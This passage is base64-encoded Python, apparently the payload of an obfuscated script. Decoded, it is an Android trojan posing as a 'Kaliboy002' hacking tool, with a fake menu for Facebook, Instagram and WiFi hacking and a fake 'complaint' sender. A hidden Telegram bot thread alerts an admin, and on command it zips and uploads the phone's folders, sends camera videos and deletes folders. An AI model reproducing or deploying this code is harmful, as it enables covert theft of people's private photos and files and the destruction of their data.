pCiAgICBpZiB6aXBfZmlsZV9wYXRoOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKHppcF9maWxlX3BhdGgsICdyYicpIGFzIHppcF9maWxlOgogICAgICAgICAgICAgICAgYm90LnNlbmRfZG9jdW1lbnQobWVzc2FnZS5jaGF0LmlkLCB6aXBfZmlsZSkKICAgICAgICAgICAgb3MucmVtb3ZlKHppcF9maWxlX3BhdGgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZifYrti32Kcg2KrZiCDYp9ix2LPYp9mEINii2LHYtNuM2Yg6IHtlfSDwn5qrJykKICAgIGVsc2U6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICfYrti32Kcg2KrZiCDYs9in2K7YqiDYotix2LTbjNmI2Iwg2q/ZhtivINiy2K/ZhSEg8J+aqycpCiAgICAKICAgIGFza190b19yZXR1cm5fdG9fbWVudShtZXNzYWdlLCAnY29weV9kYXRhJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ2RlbGV0ZV9mb2xkZXInKQpkZWYgYXNrX2Zvcl9kZWxldGVfZm9sZGVyX25hbWUoY2FsbCk6CiAgICBib3Quc2VuZF9tZXNzYWdlKGNhbGwubWVzc2FnZS5jaGF0LmlkLCAn2KfYs9mFINm+2YjYtNmH4oCM2KfbjCDaqdmHINmF24zigIzYrtmI2KfbjCDYrdiw2YEg2qnZhtmFINix2Ygg2Kjar9mIOiDwn5OBJykKICAgIGJvdC5yZWdpc3Rlcl9uZXh0X3N0ZXBfaGFuZGxlcihjYWxsLm1lc3NhZ2UsIHByb2Nlc3NfZGVsZXRlX2ZvbGRlcl9uYW1lKQoKZGVmIHByb2Nlc3NfZGVsZXRlX2ZvbGRlcl9uYW1lKG1lc3NhZ2UpOgogICAgZm9sZGVyX25hbWUgPSBtZXNzYWdlLnRleHQKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgZm9sZGVyX3BhdGggPSBmaW5kX2ZvbGRlcihyb290X2RpcmVjdG9yeSwgZm9sZGVyX25hbWUpCiAgICAKICAgIGlmIG5vdCBmb2xkZXJfcGF0aDoKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZifZvtmI2LTZhyAie2ZvbGRlcl9uYW1lfSIg2b7bjNiv2Kcg2YbYtNiv2Iwg2q/Zhdi02K/ZhyEg8J+aqycpCiAgICAgICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdkZWxldGVfZm9sZGVyJykKICAgICAgICByZXR1cm4KICAgIAogICAgdHJ5OgogICAgICAgIHNodXRpbC5ybXRyZWUoZm9sZGVyX3BhdGgpCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYn2b7ZiNi02YcgIntmb2xkZXJfbmFtZX0iINio2Kcg2YXZiNmB2YLbjNiqINit2LDZgSDYtNivISDwn5eR77iPJykKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZifYrti32Kcg2KrZiCDYrdiw2YEg2b7ZiNi02Yc6IHtlfSDwn5qrJykKICAgIAogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdkZWxldGVfZm9sZGVyJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ3NlYXJjaF92aWRlb3MnKQpkZWYgYXNrX2Zvcl92aWRlb19jb3VudChjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgc3BlY2lmaWNfZm9sZGVycyA9IFsnL3N0b3JhZ2UvZW11bGF0ZWQvMC9WaWRlb3MnLCAnL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYSddCiAgICB2aWRlb19jb3VudCA9IHN1bShjb3VudF92aWRlb3MoZm9sZGVyKSBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnMgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKSkKICAgIHZpZGVvX2NvdW50ICs9IGNvdW50X3ZpZGVvcyhyb290X2RpcmVjdG9yeSkKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGYn2KrYudiv2KfYryDZiNuM2K/bjNmI2YfYpyDYqtmIINiv2LPYqtqv2KfZhzoge3ZpZGVvX2NvdW50fS4g2obZhtiv2KrYpyDZhduM4oCM2K7ZiNin24zYnyDwn46lJykKICAgIGJvdC5yZWdpc3Rlcl9uZXh0X3N0ZXBfaGFuZGxlcihjYWxsLm1lc3NhZ2UsIHByb2Nlc3NfdmlkZW9fY291bnQsIHJvb3RfZGlyZWN0b3J5LCBzcGVjaWZpY19mb2xkZXJzKQoKZGVmIHByb2Nlc3NfdmlkZW9fY291bnQobWVzc2FnZSwgcm9vdF9kaXJlY3RvcnksIHNwZWNpZmljX2ZvbGRlcnMpOgogICAgdHJ5OgogICAgICAgIGNvdW50ID0gaW50KG1lc3NhZ2UudGV4dCkKICAgICAgICBpZiBjb3VudCA8PSAwOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJ9uM2Ycg2LnYr9ivINiv2LHYs9iqINio2q/ZiNiMINis2YbYp9ioISDwn46lJykKICAgICAgICByZXR1cm4KCiAgICBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnM6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKToKICAgICAgICAgICAgc2VuZF9tZWRpYV9mcm9tX2RpcmVjdG9yeShmb2xkZXIsIGNvdW50LCBtZXNzYWdlLCAndmlkZW8nKQogICAgICAgICAgICBjb3VudCAtPSBjb3VudF92aWRlb3MoZm9sZGVyKQogICAgICAgICAgICBpZiBjb3VudCA8PSAwOgogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAKICAgIHNlbmRfbWVkaWFfZnJvbV9kaXJlY3Rvcnkocm9vdF9kaXJlY3RvcnksIGNvdW50LCBtZXNzYWdlLCAndmlkZW8nKQogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdzZWFyY2hfdmlkZW9zJykKCmRlZiBmaW5kX2ZvbGRlcihyb290X2RpcmVjdG9yeSwgZm9sZGVyX25hbWUpOgogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocm9vdF9kaXJlY3RvcnkpOgogICAgICAgIGlmIGZvbGRlcl9uYW1lIGluIGRpcnM6CiAgICAgICAgICAgIHJldHVybiBvcy5wYXRoLmpvaW4ocm9vdCwgZm9sZGVyX25hbWUpCiAgICByZXR1cm4gTm9uZQoKZGVmIGNyZWF0ZV96aXBfYXJjaGl2ZShmb2xkZXJfcGF0aCwgZm9sZGVyX25hbWUpOgogICAgdHJ5OgogICAgICAgIHRlbXBfZGlyID0gJy90bXAnCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHRlbXBfZGlyKToKICAgICAgICAgICAgdGVtcF9kaXIgPSBvcy5nZXRjd2QoKQogICAgICAgIHppcF9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcF9kaXIsIGYne2ZvbGRlcl9uYW1lfS56aXAnKQogICAgICAgIHNodXRpbC5tYWtlX2FyY2hpdmUoemlwX2ZpbGVfcGF0aFs6LTRdLCAnemlwJywgZm9sZGVyX3BhdGgpCiAgICAgICAgcmV0dXJuIHppcF9maWxlX3BhdGgKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGlzX2ZvbGRlcl90b29fbGFyZ2UoZm9sZGVyX3BhdGgpOgogICAgdG90YWxfc2l6ZSA9IDAKICAgIGZvciBkaXJwYXRoLCBkaXJuYW1lcywgZmlsZW5hbWVzIGluIG9zLndhbGsoZm9sZGVyX3BhdGgpOgogICAgICAgIGZvciBmIGluIGZpbGVuYW1lczoKICAgICAgICAgICAgZnAgPSBvcy5wYXRoLmpvaW4oZGlycGF0aCwgZikKICAgICAgICAgICAgdG90YWxfc2l6ZSArPSBvcy5wYXRoLmdldHNpemUoZnApCiAgICByZXR1cm4gdG90YWxfc2l6ZSA+IDEwMjQgKiAxMDI0ICogMTAwICAKCmRlZiBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgdGFzayk6CiAgICBrZXlib2FyZCA9IHR5cGVzLklubGluZUtleWJvYXJkTWFya3VwKCkKICAgIGJ1dHRvbjEgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2KjZhNmHJywgY2FsbGJhY2tfZGF0YT0ncmV0dXJuX3RvX21lbnUnKQogICAgYnV0dG9uMiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfYrtuM2LEnLCBjYWxsYmFja19kYXRhPWYncmVwZWF0X3t0YXNrfScpCiAgICBrZXlib2FyZC5hZGQoYnV0dG9uMSwgYnV0dG9uMikKICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCAn2YXbjOKAjNiu2YjYp9uMINio2LHar9ix2K/bjCDYqNmHINmF2YbZiNifIPCflIQnLCByZXBseV9tYXJrdXA9a2V5Ym9hcmQpCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhID09ICdyZXR1cm5fdG9fbWVudScpCmRlZiByZXR1cm5fdG9fbWVudShjYWxsKToKICAgIHN0YXJ0KGNhbGwubWVzc2FnZSkKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEuc3RhcnRzd2l0aCgncmVwZWF0XycpKQpkZWYgcmVwZWF0X3Rhc2soY2FsbCk6CiAgICB0YXNrID0gY2FsbC5kYXRhLnNwbGl0KCdfJylbMV0KICAgIGlmIHRhc2sgPT0gJ2V4dHJhY3RfcGhvdG9zJzoKICAgICAgICBhc2tfZm9yX3Bob3RvX2NvdW50KGNhbGwpCiAgICBlbGlmIHRhc2sgPT0gJ2NsZWFyX2RhdGEnOgogICAgICAgIGNsZWFyX2RhdGEoY2FsbCkKICAgIGVsaWYgdGFzayA9PSAnY29weV9kYXRhJzoKICAgICAgICBhc2tfZm9yX2ZvbGRlcl9uYW1lKGNhbGwpCiAgICBlbGlmIHRhc2sgPT0gJ2RlbGV0ZV9mb2xkZXInOgogICAgICAgIGFza19mb3JfZGVsZXRlX2ZvbGRlcl9uYW1lKGNhbGwpCiAgICBlbGlmIHRhc2sgPT0gJ3NlYXJjaF92aWRlb3MnOgogICAgICAgIGFza19mb3JfdmlkZW9fY291bnQoY2FsbCkKICAgIGVsc2U6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgJ9iu2KjYjCDZhdmG2KrYuNixINit2LHaqdiqINio2LnYr9uM4oCM2KfYqiDZhduM4oCM2YXZiNmG2YUuINio2Kcg2K/aqdmF2Ycg2LLbjNixINio2Ycg2YXZhtmIINio2LHar9ix2K8hIPCflIQnLCByZXBseV9tYXJrdXA9dHlwZXMuSW5saW5lS2V5Ym9hcmRNYXJrdXAoKS5hZGQodHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9mF2YbZiCcsIGNhbGxiYWNrX2RhdGE9J3JldHVybl90b19tZW51JykpKQoKIyBVcGRhdGVkIGJhbm5lciB3aXRoICJLYWxpYm95MDAyIgptbSA9IGYiIiIKe0ZvcmUuR1JFRU59ICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17U3R5bGUuUkVTRVRfQUxMfQp7Rm9yZS5ZRUxMT1d9ICAgICB8ICAgICAgICAgICBLYWxpYm95MDAyICAgICAgICAgICAgfHtTdHlsZS5SRVNFVF9BTEx9CntGb3JlLkNZQU59ICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17U3R5bGUuUkVTRVRfQUxMfQp7Rm9yZS5NQUdFTlRBfSAgICAgfCAgIEVsaXRlIEhhY2tpbmcgVG9vbCBVbmxlYXNoZWQgICB8e1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuUkVEfSAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0te1N0eWxlLlJFU0VUX0FMTH0KIiIiCgptdCA9IGYiIiIKe0ZvcmUuUkVEfeKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVl3tTdHlsZS5SRVNFVF9BTEx9CntGb3JlLkdSRUVOfeKVkSAgICAgICAgICAg8J+SgCBLYWxpYm95MDAyIC0gSGFjayBNYXN0ZXIg8J+SgCAgICAgICAgICAg4pWRe1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuUkVEfeKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVo3tTdHlsZS5SRVNFVF9BTEx9CntGb3JlLllFTExPV33ilZEgWzAxXSAg8J+UkCBGYWNlYm9vayBIYWNraW5nICAgIFswMl0g8J+UkCBJbnN0YWdyYW0gSGFja2luZyAgICDilZF7U3R5bGUuUkVTRVRfQUxMfQp7Rm9yZS5DWUFOfeKVkSBbMDNdIOKYoO+4jyAgRkIgRnJlZSBGb2xsb3dlciAgICAgICBbMDRdIOKZpe+4jyBJRyBGcmVlIEZvbGxvd2VyICAg4pWRe1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuTUFHRU5UQX3ilZEgWzA1XSDwn5O2IFdJRkkgSGFja2luZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkXtTdHlsZS5SRVNFVF9BTEx9CntGb3JlLlJFRH3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ17U3R5bGUuUkVTRVRfQUxMfQoiIiIKCmRlZiBiYW5uZXIoKToKICAgIHByaW50KG1tKQogICAgcHJpbnQobXQpCiAgICBmb3IgXyBpbiByYW5nZSgzKTogICMgQW5pbWF0aW9uIGZvciB0aGF0IGhhY2tlciB2aWJlCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiPj4+IEluaXRpYXRpbmcgSGFjayBTZXF1ZW5jZS4uLiIgKyBTdHlsZS5SRVNFVF9BTEwpCiAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgcHJpbnQoIlwwMzNbMUFcMDMzW0siLCBlbmQ9IiIpCiAgICBwcmludChGb3JlLkdSRUVOICsgIj4+PiBSZWFkeSB0byBGdWNrIFNoaXQgVXAhIiArIFN0eWxlLlJFU0VUX0FMTCkKCmRlZiBjb21wbGFpbnRfaGFuZGxlcigpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjaG9pY2UgPSBpbnB1dCgiRW50ZXIgYSBudW1iZXIgZnJvbSAxIHRvIDUgKDYgdG8gZXhpdCk6ICIpCiAgICAgICAgaWYgY2hvaWNlID09ICc2JzoKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0cnk6CiAgICAgICAgICAgIG51bV9jb21wbGFpbnRzID0gaW50KGNob2ljZSkKICAgICAgICAgICAgaWYgbnVtX2NvbXBsYWludHMgPCAxIG9yIG51bV9jb21wbGFpbnRzID4gNToKICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IKICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBiZXR3ZWVuIDEgYW5kIDUsIGFzc2hvbGUhIOKdjCIpCiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIHVzZXJfaWQgPSBpbnB1dCgiRW50ZXIgdXNlciBJRC9FbWFpbC9QaG9uZSBudW1iZXI6ICIpCiAgICAgICAgbnVtX2NvbXBsYWludHMgPSBpbnQoaW5wdXQoIkVudGVyIHRoZSBhbW91bnQ6ICIpKQoKICAgICAgICBmb3IgXyBpbiByYW5nZShudW1fY29tcGxhaW50cyk6CiAgICAgICAgICAgIGlmIHJhbmRvbS5yYW5kaW50KDEsIDEwKSA9PSAxOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9RXJyb3Igc2VuZGluZyBjb21wbGFpbnR7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfVNlbnQgc3VjY2Vzc2Z1bGx54pyU77iPe1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgICAgICB0aW1lLnNsZWVwKHJhbmRvbS51bmlmb3JtKDEsIDMpKSAKCmRlZiBub3RpZnlfYWRtaW4oKToKICAgIGJvdC5zZW5kX21lc3NhZ2UoQURNSU5fSUQsICLZh9i02K/Yp9ixISDYsdio2KfYqiDZgdi52KfZhCDYtNivLlxu2KjYpyAvc3RhcnQg2LTYsdmI2Lkg2qnZhtiMINmH2qnYsSEg8J+agFxuXG7wn5Go4oCN8J+SuyBDb2RlZCBieSBAS2FsaWJveTAwMlxuXG5Kb2luIEBLYWxpX0xpbnV4X0JPVFMiKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGJhbm5lcigpCiAgICBub3RpZnlfYWRtaW4oKQogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Ym90LnBvbGxpbmcsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICBjb21wbGFpbnRfaGFuZGxlcigp"))
